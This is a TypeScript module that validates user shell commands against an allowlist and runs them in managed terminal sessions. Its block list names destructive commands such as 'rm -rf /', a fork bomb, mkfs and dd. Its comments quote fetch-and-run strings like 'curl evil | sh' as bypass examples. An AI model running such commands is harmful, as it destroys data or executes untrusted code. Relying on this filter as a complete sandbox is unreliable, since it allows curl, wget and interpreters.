import { spawn, type ChildProcess } from "node:child_process";
import { randomUUID } from "node:crypto";
import { EventEmitter } from "node:events";

/**
 * Command validation patterns for the allowlist.
 * These are the base commands that users are allowed to execute.
 */
export const ALLOWED_COMMANDS = new Set([
  // Version control
  "git",
  // Package managers
  "npm",
  "pnpm",
  "yarn",
  "bun",
  // File operations
  "ls",
  "cat",
  "echo",
  "pwd",
  "cd",
  "mkdir",
  "touch",
  "cp",
  "mv",
  "rm",
  "head",
  "tail",
  "less",
  "more",
  "find",
  "grep",
  // System info
  "clear",
  "which",
  "whoami",
  "uname",
  "date",
  // Node/JS
  "node",
  "npx",
  "tsx",
  // Python
  "python",
  "python3",
  "pip",
  "pip3",
  // Network
  "curl",
  "wget",
  // Build tools
  "make",
  "cmake",
  // Process management
  "ps",
  "top",
  "htop",
  "kill",
  "pkill",
  // Shell builtins that are safe
  "source",
  ".",
  "export",
  "env",
  "printenv",
  "alias",
  // Editors (for viewing)
  "code", // VS Code CLI
  "vim",
  "vi",
  "nano",
]);

/**
 * Blocked dangerous patterns - additional defense in depth beyond the allowlist.
 * These patterns are explicitly forbidden even if the base command is allowed.
 */
const BLOCKED_PATTERNS = [
  // System destruction
  /rm\s+(-[rf]+\s+)?\/\s*$/i,  // rm -rf / or rm /
  /rm\s+(-[rf]+\s+)?\/\*/i,    // rm -rf /*
  />\s*\/dev\/sda/i,            // Direct disk write
  /:\(\)\s*\{\s*:\s*\|:\s*&\s*\};\s*:/i, // Fork bomb
  /mkfs\.\w+\s+/i,              // Filesystem formatting
  /dd\s+if=/i,                  // dd with input file
  /\.\s*\/dev\/null/i,          // Sourcing /dev/null tricks
];

/**
 * Command-substitution patterns that would cause the shell to evaluate an
 * arbitrary sub-command BEFORE the allowlist check runs (e.g. `git $(curl ... | sh)`
 * evaluates to whatever the curl prints). These bypass the allowlist entirely
 * regardless of which base command is used, so they must be rejected outright.
 */
const SUBSTITUTION_PATTERNS = [
  /\$\(/,   // $(...)  — command substitution
  /`/,      // `...`   — backtick command substitution
  /<\(/,    // <(...)  — process substitution (bash)
  />\(/,    // >(...)  — process substitution (bash)
];

/** Chaining operators that let users combine commands in one request. */
const CHAIN_OPERATORS = /&&|\|\||;|(?<!\|)\|(?!\|)/;

/**
 * Extracts the base command from a command string.
 * Handles common prefixes like environment variables and sudo.
 */
function extractBaseCommand(command: string): string | null {
  // Remove leading whitespace
  let trimmed = command.trim();
  
  // Remove environment variable assignments (e.g., "FOO=bar cmd")
  // Match patterns like VAR=value or VAR="value" at the start
  while (/^[A-Za-z_][A-Za-z0-9_]*=/.test(trimmed)) {
    const match = trimmed.match(/^([A-Za-z_][A-Za-z0-9_]*=(?:[^\s]*|"[^"]*"|'[^']*'))\s*/);
    if (match) {
      trimmed = trimmed.slice(match[0].length).trim();
    } else {
      break;
    }
  }
  
  // Remove sudo prefix if present
  if (trimmed.startsWith("sudo ")) {
    trimmed = trimmed.slice(5).trim();
  }
  
  // Extract the first word (the base command)
  const match = trimmed.match(/^([A-Za-z0-9._-]+)/);
  return match ? match[1].toLowerCase() : null;
}

/**
 * Validates a command string against the allowlist and blocklist.
 * Returns an object with validation result and error message if blocked.
 *
 * Three layers of defense, applied in order:
 *   1. Reject command substitution (`$(...)`, backticks, process substitution),
 *      which would otherwise let an allowlisted base command run an arbitrary
 *      inner command before validation completes.
 *   2. Reject known-dangerous literal patterns.
 *   3. Split on chain operators (`;`, `&&`, `||`, `|`) and require *every*
 *      segment's base command to be in the allowlist — without this, a chain
 *      like `git status; curl evil | sh` would pass because only the first
 *      token is checked.
 */
export function validateCommand(command: string): { valid: boolean; error?: string } {
  // Reject command substitution outright — it bypasses the allowlist.
  for (const pattern of SUBSTITUTION_PATTERNS) {
    if (pattern.test(command)) {
      return { valid: false, error: "Command substitution is not allowed" };
    }
  }

  // Reject control characters and NUL bytes defensively.
  if (/[\0\r\n]/.test(command)) {
    return { valid: false, error: "Command contains invalid control characters" };
  }

  // Check for blocked patterns (defense in depth).
  for (const pattern of BLOCKED_PATTERNS) {
    if (pattern.test(command)) {
      return { valid: false, error: "Command contains dangerous patterns and is not allowed" };
    }
  }

  // Split on chaining operators and validate each segment. Without this, a
  // chain like `git status; curl ... | sh` passes with only the first base
  // command checked.
  const segments = command.split(CHAIN_OPERATORS);
  for (const raw of segments) {
    const segment = raw.trim();
    if (segment.length === 0) continue;

    const baseCommand = extractBaseCommand(segment);
    if (!baseCommand) {
      return { valid: false, error: "Could not parse command" };
    }

    if (!ALLOWED_COMMANDS.has(baseCommand)) {
      return {
        valid: false,
        error: `Command '${baseCommand}' is not in the allowed command list. Allowed commands: ${Array.from(ALLOWED_COMMANDS).sort().join(", ")}`,
      };
    }
  }

  return { valid: true };
}

/**
 * Terminal session representing an active shell process.
 */
export interface TerminalSession {
  id: string;
  command: string;
  process: ChildProcess;
  startTime: Date;
  output: string[];
  exitCode: number | null;
  killed: boolean;
}

/**
 * Event payload for terminal output events.
 */
export interface TerminalOutputEvent {
  sessionId: string;
  type: "stdout" | "stderr" | "exit";
  data: string;
  exitCode?: number;
}

/**
 * Manages terminal sessions for interactive shell execution.
 * Sessions are ephemeral (in-memory only) and automatically cleaned up.
 */
export class TerminalSessionManager extends EventEmitter {
  private sessions = new Map<string, TerminalSession>();
  private readonly defaultTimeout = 30_000; // 30 seconds
  
  /**
   * Creates a new terminal session and spawns the command.
   * Returns the session ID for tracking.
   */
  createSession(command: string, cwd: string): { sessionId: string; error?: string } {
    // Validate command before execution
    const validation = validateCommand(command);
    if (!validation.valid) {
      return { sessionId: "", error: validation.error };
    }
    
    const sessionId = randomUUID();
    
    // Spawn the process in a shell to support pipes, redirects, etc.
    const childProcess = spawn(command, [], {
      cwd,
      shell: true,
      stdio: ["pipe", "pipe", "pipe"],
      env: { ...process.env, FORCE_COLOR: "1", TERM: "xterm-256color" },
    });
    
    const session: TerminalSession = {
      id: sessionId,
      command,
      process: childProcess,
      startTime: new Date(),
      output: [],
      exitCode: null,
      killed: false,
    };
    
    this.sessions.set(sessionId, session);
    
    // Handle stdout
    childProcess.stdout?.on("data", (data: Buffer) => {
      const chunk = data.toString("utf-8");
      session.output.push(chunk);
      this.emit("output", { sessionId, type: "stdout", data: chunk } as TerminalOutputEvent);
    });
    
    // Handle stderr
    childProcess.stderr?.on("data", (data: Buffer) => {
      const chunk = data.toString("utf-8");
      session.output.push(chunk);
      this.emit("output", { sessionId, type: "stderr", data: chunk } as TerminalOutputEvent);
    });
    
    // Handle process exit
    childProcess.on("exit", (code: number | null) => {
      session.exitCode = code ?? 0;
      this.emit("output", { 
        sessionId, 
        type: "exit", 
        data: `Process exited with code ${code ?? 0}`,
        exitCode: code ?? 0,
      } as TerminalOutputEvent);
      
      // Schedule cleanup after a delay to allow final output consumption
      setTimeout(() => this.cleanupSession(sessionId), 5_000);
    });
    
    // Handle errors (e.g., command not found)
    childProcess.on("error", (err: Error) => {
      const errorMsg = err.message;
      session.output.push(errorMsg);
      session.exitCode = 127; // Command not found exit code
      this.emit("output", { sessionId, type: "stderr", data: errorMsg });
      this.emit("output", { 
        sessionId, 
        type: "exit", 
        data: `Process failed: ${errorMsg}`,
        exitCode: 127,
      });
      
      setTimeout(() => this.cleanupSession(sessionId), 5_000);
    });
    
    // Set up timeout
    const timeout = setTimeout(() => {
      if (!session.exitCode && !session.killed) {
        this.killSession(sessionId, "SIGTERM");
        this.emit("output", { 
          sessionId, 
          type: "stderr", 
          data: "\n[Command timed out after 30 seconds]\n" 
        });
      }
    }, this.defaultTimeout);
    
    // Clear timeout when process exits
    childProcess.on("exit", () => clearTimeout(timeout));
    
    return { sessionId };
  }
  
  /**
   * Gets a session by ID.
   */
  getSession(sessionId: string): TerminalSession | undefined {
    return this.sessions.get(sessionId);
  }
  
  /**
   * Kills a running session's process.
   * Returns true if killed, false if not found or already exited.
   */
  killSession(sessionId: string, signal: NodeJS.Signals = "SIGTERM"): boolean {
    const session = this.sessions.get(sessionId);
    if (!session || session.exitCode !== null || session.killed) {
      return false;
    }
    
    session.killed = true;
    
    // Kill the process group to handle child processes
    try {
      if (session.process.pid) {
        process.kill(-session.process.pid, signal);
      }
    } catch {
      // Fallback to killing just the main process
      session.process.kill(signal);
    }
    
    return true;
  }
  
  /**
   * Cleans up a session from memory.
   */
  cleanupSession(sessionId: string): boolean {
    const session = this.sessions.get(sessionId);
    if (!session) return false;
    
    // Ensure process is killed if still running
    if (session.exitCode === null && !session.killed) {
      this.killSession(sessionId, "SIGKILL");
    }
    
    this.sessions.delete(sessionId);
    return true;
  }
  
  /**
   * Lists all active sessions.
   */
  listSessions(): Array<{ id: string; command: string; running: boolean; startTime: Date }> {
    return Array.from(this.sessions.values()).map(s => ({
      id: s.id,
      command: s.command,
      running: s.exitCode === null && !s.killed,
      startTime: s.startTime,
    }));
  }
  
  /**
   * Cleans up all sessions (useful for shutdown).
   */
  cleanupAll(): void {
    for (const [sessionId] of this.sessions) {
      this.cleanupSession(sessionId);
    }
  }
}

/**
 * Singleton instance of the terminal session manager.
 */
export const terminalSessionManager = new TerminalSessionManager();
